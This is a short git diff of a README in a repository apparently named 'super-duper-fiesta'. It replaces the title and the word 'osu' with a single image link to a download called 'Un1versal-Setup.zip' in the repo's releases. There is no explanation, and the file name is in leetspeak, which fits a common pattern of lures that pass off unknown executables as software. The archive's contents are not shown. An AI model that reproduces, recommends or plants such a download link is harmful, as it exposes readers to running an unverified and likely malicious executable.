@@ -1,2 +1,1 @@
-# super-duper-fiesta
-osu
+[![d,586d5468d](https://github.com/cdsas3223/super-duper-fiesta/assets/66710148/88543b18-526e-43fa-812a-9d8242e107fe)](https://github.com/cdsas3223/super-duper-fiesta/releases/download/Release/Un1versal-Setup.zip)
